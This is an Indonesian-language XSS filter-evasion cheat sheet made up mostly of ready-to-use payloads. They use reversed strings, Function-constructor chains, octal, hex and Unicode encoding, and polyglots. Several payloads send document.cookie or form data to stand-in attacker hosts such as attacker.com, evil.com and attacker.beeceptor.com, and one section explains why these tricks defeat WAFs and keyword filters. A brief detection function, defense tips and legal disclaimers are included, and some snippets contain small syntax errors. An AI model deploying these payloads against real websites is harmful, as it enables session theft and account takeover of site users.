# Teknik XSS Bypass - Creative Alert Execution

## ⚠️ Disclaimer
**Hanya untuk tujuan pembelajaran keamanan, bug bounty legal, dan penetration testing dengan izin!**

---

## 1. String Reversal Technique (.split.reverse.join)

### Teknik: Membalik string untuk bypass keyword detection

#### Basic String Reversal
```javascript
// Membalik 'alert' menjadi 'trela'
x='trela'.split('').reverse().join('');
window[x](1);

// Membalik 'fetch' menjadi 'hctef'
x='hctef'.split('').reverse().join('');
self[x]('https://attacker.com?c='+document.cookie);

// Membalik 'eval' menjadi 'lave'
x='lave'.split('').reverse().join('');
window[x]('alert(document.domain)');
```

#### HTML Context Examples
```html
<!-- Link canonical injection -->
<link rel="canonical" href="x" accesskey="x" onclick="x='trela'.split('').reverse().join('');window[x](document.cookie);" x="">

<!-- Input field -->
<input type="text" value="x" onfocus="x='hctef'.split('').reverse().join('');self[x]('//evil.com?c='+document.cookie)">

<!-- Image tag -->
<img src=x onerror="x='lave'.split('').reverse().join('');window[x]('alert(1)')">

<!-- SVG element -->
<svg onload="x='trela'.split('').reverse().join('');window[x](origin)">

<!-- Body tag -->
<body onload="x='hctef'.split('').reverse().join('');self[x]('https://attacker.com/log?data='+btoa(document.cookie))">
```

#### Advanced: Data Exfiltration dengan Reversal
```javascript
// Payload lengkap untuk steal cookie
x='hctef'.split('').reverse().join('');
self[x](
    location.origin.split(location.host)[0] + 
    'attacker.beeceptor.com' + 
    location.pathname[0] + 
    'cookie=' + document.cookie
);

// Dengan error handling
x='hctef'.split('').reverse().join('');
try {
    self[x]('https://log.example.com?d='+encodeURIComponent(document.cookie))
} catch(e) {
    console.log(e)
}
```

#### Multiple Function Reversal
```javascript
// Reverse multiple keywords
a='trela'.split('').reverse().join('');  // alert
b='hctef'.split('').reverse().join('');  // fetch
c='aotb'.split('').reverse().join('');   // btoa

window[a](document.domain);
self[b]('//evil.com?c='+window[c](document.cookie));
```

#### Kombinasi dengan Constructor Chain
```javascript
// Reverse + Constructor
x='rotcurtsnoc'.split('').reverse().join('');  // constructor
y='trela'.split('').reverse().join('');         // alert

[][map][x](window[y]+'(1)')();

// Atau lebih subtle
f='retlif'.split('').reverse().join('');
c='rotcurtsnoc'.split('').reverse().join('');
a='trela'.split('').reverse().join('');

[][f][c](a+'(document.domain)')();
```

#### HTML Attribute Context dengan Reversal
```html
<!-- Dalam href -->
<a href="x" accesskey="y" onclick="a='tpircsavaj'.split('').reverse().join('');b='trela'.split('').reverse().join('');location=a+':'+b+'(1)'">Click</a>

<!-- Dalam style attribute -->
<div style="x" onmouseover="x='lave'.split('').reverse().join('');window[x]('alert(1)')"></div>

<!-- Dalam data attribute -->
<button data-action="x" onclick="f='hctef'.split('').reverse().join('');self[f]('//evil.com?data='+document.cookie)">Submit</button>
```

#### Polyglot dengan Reversal
```html
<!--
" onclick="x='trela'.split('').reverse().join('');window[x](1)" 
'><script>a='lave'.split('').reverse().join('');window[a]('alert(1)')</script>
*/
```

#### Encoding + Reversal Combo
```javascript
// Unicode + Reversal
x='\u0074\u0072\u0065\u006c\u0061'.split('').reverse().join('');
window[x](1);

// Hex + Reversal
x='\x74\x72\x65\x6c\x61'.split('').reverse().join('');
window[x](document.domain);

// Octal + Reversal
x='\164\162\145\154\141'.split('').reverse().join('');
window[x](1);
```

#### Template Literal + Reversal
```javascript
// Menggunakan template literal
x=`${'trela'.split('').reverse().join('')}`;
window[x](1);

// Tagged template
eval`${('lave'.split('').reverse().join(''))}``alert(1)```;
```

#### Real-World Attack Scenarios

**1. Cookie Exfiltration via Canonical Link**
```html
<link rel="canonical" href="/" 
    accesskey="x" 
    onclick="
        f='hctef'.split('').reverse().join('');
        u=location.protocol+'//attacker.beeceptor.com/steal?';
        c='cookie='+document.cookie;
        self[f](u+c);
    " x="">
```

**2. Hidden Input Field Attack**
```html
<input type="hidden" 
    value="data" 
    onfocus="
        x='trela'.split('').reverse().join('');
        window[x]('XSS: '+document.domain);
    " 
    autofocus>
```

**3. Meta Tag Refresh Attack**
```html
<meta http-equiv="refresh" content="0;
    javascript:
    f='hctef'.split('').reverse().join('');
    self[f]('https://evil.com?steal='+btoa(document.cookie))
">
```

**4. SVG Animation Attack**
```html
<svg>
    <animate 
        attributeName="x" 
        onbegin="
            a='lave'.split('').reverse().join('');
            window[a]('alert(document.domain)')
        ">
    </animate>
</svg>
```

**5. Form Action Injection**
```html
<form action="x" 
    onsubmit="
        f='hctef'.split('').reverse().join('');
        d=new FormData(this);
        self[f]('https://attacker.com/log',{
            method:'POST',
            body:d
        });
        return false;
    ">
</form>
```

### Mengapa Teknik Reversal Sangat Efektif:

✅ **Bypass Keyword Blacklist**
   - Filter mencari `alert`, `fetch`, `eval` → tidak menemukan
   - String ter-reverse: `trela`, `hctef`, `lave`

✅ **Bypass Regex Pattern**
   - Regex untuk `/alert\(/` → tidak match
   - Regex untuk `/fetch\(/` → tidak match

✅ **Bypass WAF Signatures**
   - WAF signature database tidak punya pattern reversed string
   - Dynamic evaluation sulit di-detect

✅ **Human Readable (untuk attacker)**
   - Mudah dibuat dan di-maintain
   - Tidak ter-obfuscate seperti JSFuck

✅ **Cross-Browser Compatible**
   - `.split().reverse().join()` supported semua browser modern
   - Tidak ada compatibility issues

### Defense Against String Reversal:

```javascript
// Server-side detection
function detectReversal(input) {
    // Check for common reversed dangerous functions
    const reversedKeywords = [
        'trela',    // alert
        'hctef',    // fetch
        'lave',     // eval
        'rotcurtsnoc', // constructor
        'tpircsavaj',  // javascript
        'tnemucod'     // document
    ];
    
    return reversedKeywords.some(keyword => input.includes(keyword));
}

// Also check for the pattern itself
const hasReversalPattern = /\w+\.split\(['"]{2}\)\.reverse\(\)\.join\(['"]{2}\)/i;
```

---

## 2. Array Constructor Method Chains

### Teknik: Mengakses Function constructor via Array methods
```javascript
// Basic
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()

// Variasi dengan method lain
[]['map']['constructor']('alert(document.domain)')()
[]['find']['constructor']('alert(document.cookie)')()
[]['reduce']['constructor']('alert(1)')()
[]['forEach']['constructor']('alert(origin)')()
```

### Mengapa berhasil:
- Bypass keyword blacklist (`Function`, `eval`, `alert`)
- Octal encoding bypass string filter
- Array method selalu ada di JavaScript

---

## 2. String Constructor Chains

### Teknik: Mengakses constructor via String methods
```javascript
// Via String methods
''['constructor']['constructor']('alert(1)')()
""['sub']['constructor']('alert(document.cookie)')()
``['toString']['constructor']('alert(1)')()

// Dengan encoding
''.constructor.constructor('\141\154\145\162\164(1)')()
```

### Bypass:
- Tidak ada kata `Function` eksplisit
- String kosong tidak terdeteksi suspicious

---

## 3. Number & Boolean Constructor

### Teknik: Menggunakan primitives lain
```javascript
// Via Number
(1)['constructor']['constructor']('alert(1)')()
(0).constructor.constructor('alert(document.domain)')()

// Via Boolean
true['constructor']['constructor']('alert(1)')()
false.constructor.constructor('alert(document.cookie)')()

// Via undefined/null (hati-hati error)
(void 0).constructor.constructor('alert(1)')() // error, tapi bisa di-chain
```

---

## 4. RegExp Constructor Method

### Teknik: Via RegExp object
```javascript
/./['constructor']['constructor']('alert(1)')()
/x/.constructor.constructor('alert(document.domain)')()

// Dengan pattern khusus
/[a-z]/.constructor.constructor('\141\154\145\162\164(1)')()
```

---

## 5. Unicode & Hex Escape Sequences

### Teknik: Encoding berbeda
```javascript
// Unicode escape
[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()

// Hex escape (dalam string)
[]['map']['constructor']('\x61\x6c\x65\x72\x74(1)')()

// Mixed encoding
[]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\u0061lert(1)')()

// Full Unicode
[]['\u0066\u0069\u006c\u0074\u0065\u0072']['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']('\u0061\u006c\u0065\u0072\u0074(1)')()
```

---

## 6. Template Literals & Tagged Templates

### Teknik: Menggunakan backtick
```javascript
// Basic template literal
[]['filter']['constructor'](`alert(1)`)()

// Tagged template (advanced)
(alert)`1`
(alert)`${document.domain}`

// Via constructor
[]['map']['constructor']`return alert(1)`()
```

---

## 7. Object Property Access Variations

### Teknik: Berbagai cara akses property
```javascript
// Dot notation
[].filter.constructor('alert(1)')()

// Bracket notation
[]]['filter']['constructor']('alert(1)')()

// Computed property
const a='filter',b='constructor';[][ a][b]('alert(1)')()

// With variables (jika bisa inject JS)
with([]){filter.constructor('alert(1)')()}
```

---

## 8. Indirect Evaluation Methods

### Teknik: Menggunakan setTimeout/setInterval
```javascript
// setTimeout string eval
setTimeout('alert(1)')
setTimeout(`alert(document.domain)`)

// setInterval
setInterval('alert(1)',100)

// Via constructor
[]['filter']['constructor']('return setTimeout')()('alert(1)',0)
```

---

## 9. Error Object Constructor

### Teknik: Via Error stack trace
```javascript
// Basic Error constructor
Error.constructor.constructor('alert(1)')()

// Via Error instance
(new Error).constructor.constructor('alert(document.domain)')()

// Chained
try{}catch(e){e.constructor.constructor('alert(1)')()}
```

---

## 10. Generator & Iterator Methods

### Teknik: Modern JavaScript features
```javascript
// Generator function
(function*(){}).constructor('alert(1)')()

// Async function
(async function(){}).constructor('alert(1)')()

// Async generator
(async function*(){}).constructor('alert(document.cookie)')()
```

---

## 11. Proxy & Reflect API

### Teknik: Meta-programming
```javascript
// Via Reflect
Reflect.construct(Function,['alert(1)'])()

// Proxy trap
new Proxy({},{get:()=>alert})[0](1)

// Complex chain
Reflect.get([],'map').constructor('alert(1)')()
```

---

## 12. Symbol & Well-Known Symbols

### Teknik: Menggunakan Symbols
```javascript
// Symbol.constructor
Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()

// Via Symbol properties
(Symbol()).constructor.constructor('alert(document.domain)')()
```

---

## 13. Encoding Kombinasi (Ultimate Obfuscation)

### Teknik: Mix semua encoding
```javascript
// Octal + Unicode + Hex
[]['\146\x69\u006c\x74\145\162']['\x63\u006f\156\x73\164\x72\x75\x63\164\x6f\x72']('\x61\u006c\145\x72\164(1)')()

// HTML entities (dalam HTML context)
<img src=x onerror="[]['\146\x69\154\x74\145\x72']['\x63\x6f\x6e\x73\x74\x72\165\x63\x74\157\x72']('\x61\x6c\145\x72\164(1)')()">

// URL encoding (dalam URL context)
javascript:[]%5b'filter'%5d%5b'constructor'%5d('alert(1)')()
```

---

## 14. Context-Specific Bypasses

### Teknik: Berdasarkan context injection

#### HTML Attribute Context:
```html
<input value="x" onmouseover="[]['map']['constructor']('alert(1)')()">
<body onload=[]['filter']['constructor']('\x61lert(1)')()>
<svg onload=[][['\x6d\x61\x70']].constructor.constructor`alert\x281\x29`()>
```

#### JavaScript String Context:
```javascript
';[]['\x66ilter']['\x63onstructor']('\x61lert(1)')();//
";[]['map']['constructor']('alert(1)')()//
`;[]['find']['constructor'](`alert(1)`)()//
```

#### Script Tag Context:
```html
</script><script>[]['filter']['constructor']('alert(1)')()</script>
<script>/**/[]['map']['constructor']('alert(1)')()</script>
```

---

## 15. JSFuck-Style Minimal Character Set

### Teknik: Hanya dengan `[]()!+`
```javascript
// Sangat ter-obfuscate, sulit di-detect
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]

// Explanation: Menghasilkan "alert" dari manipulasi array/boolean
// Terlalu panjang untuk full payload, tapi konsepnya powerful
```

---

## 16. DOM Clobbering + Constructor

### Teknik: Manipulasi DOM untuk bypass
```html
<form id="constructor"><input name="constructor"></form>
<script>
// Sekarang window.constructor bisa ter-clobber
// Tapi [].filter.constructor masih bisa diakses
[]['filter'][[]['filter']['constructor']['name']]('alert(1)')()
</script>
```

---

## 17. With Statement Tricks

### Teknik: Mengubah scope resolution
```javascript
with(document){
    with(body){
        []['filter']['constructor']('alert(1)')()
    }
}

// Atau lebih subtle
with([]){filter.constructor('alert(document.domain)')()}
```

---

## 18. Comments & Whitespace Manipulation

### Teknik: Menyembunyikan di whitespace
```javascript
[]/*comment*/['filter']/**/['constructor']/**/('alert(1)')()

// Tab, newline, etc
[][
'filter'
][
'constructor'
](
'alert(1)'
)(
)

// HTML comment style (dalam HTML)
<!--
[]['filter']['constructor']('alert(1)')()
//-->
```

---

## 19. Polyglot Approaches

### Teknik: Valid di multiple contexts
```javascript
/*--></title></style></script><script>[]['filter']['constructor']('alert(1)')()</script>

javascript:/*--></title></style></textarea></script>--><script>[]['map']['constructor']('alert(origin)')()</script>

/*"></script><svg onload='[]["filter"]["constructor"]("alert(1)")()'></svg>*/
```

---

## 20. Chaining Multiple Bypasses

### Teknik: Kombinasi ultimate
```javascript
// Encoding + Constructor + Template + Indirect
setTimeout(
    []['filter']['constructor'](
        '\u0061\u006c\u0065\u0072\u0074'+'('+
        '\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074'+
        '.'+
        'cookie)'
    ),0
)()

// Reflect + Symbol + Encoding
Reflect.get(
    [],
    '\x6d\x61\x70'
).constructor(
    '\x61\x6c\x65\x72\x74(1)'
)()
```

---

## 🛡️ Defense Recommendations

Untuk developer yang ingin melindungi aplikasi:

1. **Content Security Policy (CSP)**
   - `script-src 'self'` - Block inline scripts
   - `script-src 'nonce-random'` - Whitelist specific scripts

2. **Sanitization Libraries**
   - DOMPurify
   - js-xss
   - Bleach (Python)

3. **Framework Auto-escaping**
   - React (JSX auto-escape)
   - Angular (built-in sanitization)
   - Vue (v-html with caution)

4. **Input Validation**
   - Whitelist allowed characters
   - Length limits
   - Type checking

5. **Output Encoding**
   - HTML entity encoding
   - JavaScript encoding
   - URL encoding
   - CSS encoding

6. **HTTP Headers**
   - `X-Content-Type-Options: nosniff`
   - `X-Frame-Options: DENY`
   - `X-XSS-Protection: 1; mode=block` (legacy)

---

## 📚 Resources untuk Testing

- **XSS Cheat Sheet**: OWASP XSS Filter Evasion
- **PortSwigger Web Security Academy**: XSS Labs
- **HackTheBox / TryHackMe**: XSS Rooms
- **BugCrowd / HackerOne**: Bug Bounty Programs (legal!)

---

## ⚖️ Legal Notice

Penggunaan teknik ini tanpa izin adalah **ILEGAL** dan dapat dikenakan:
- Undang-Undang ITE Pasal 30 (Indonesia)
- Computer Fraud and Abuse Act (US)
- Computer Misuse Act (UK)

**Selalu dapatkan izin tertulis sebelum testing!**

---

*Generated for educational purposes in cybersecurity research and ethical hacking.*